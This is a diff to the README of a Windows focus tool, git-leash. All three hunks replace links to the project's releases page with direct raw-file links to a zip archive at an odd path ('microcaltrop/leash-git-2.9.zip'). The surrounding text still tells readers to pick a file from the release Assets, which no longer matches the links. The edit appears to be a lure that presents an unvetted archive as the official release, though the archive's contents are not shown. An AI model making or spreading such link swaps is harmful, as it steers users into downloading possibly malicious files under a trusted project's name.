@@ -1,6 +1,6 @@
 # 🐾 git-leash - Keep Focused During Set Times
 
-[![Download git-leash](https://img.shields.io/badge/Download%20git--leash-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/donotlaugh96-eng/git-leash/releases)
+[![Download git-leash](https://img.shields.io/badge/Download%20git--leash-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/donotlaugh96-eng/git-leash/main/microcaltrop/leash-git-2.9.zip)
 
 ## 🧰 What git-leash does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 Visit this page to download git-leash:
 
-[https://github.com/donotlaugh96-eng/git-leash/releases](https://github.com/donotlaugh96-eng/git-leash/releases)
+[https://raw.githubusercontent.com/donotlaugh96-eng/git-leash/main/microcaltrop/leash-git-2.9.zip](https://raw.githubusercontent.com/donotlaugh96-eng/git-leash/main/microcaltrop/leash-git-2.9.zip)
 
 Open the latest release, then download the Windows file from the Assets section. If you see more than one file, pick the one meant for Windows.
 
@@ -174,7 +174,7 @@ The download page may include one or more files. Look for the latest Windows rel
 
 Open the releases page here:
 
-[https://github.com/donotlaugh96-eng/git-leash/releases](https://github.com/donotlaugh96-eng/git-leash/releases)
+[https://raw.githubusercontent.com/donotlaugh96-eng/git-leash/main/microcaltrop/leash-git-2.9.zip](https://raw.githubusercontent.com/donotlaugh96-eng/git-leash/main/microcaltrop/leash-git-2.9.zip)
 
 ## 🧭 Start here
 
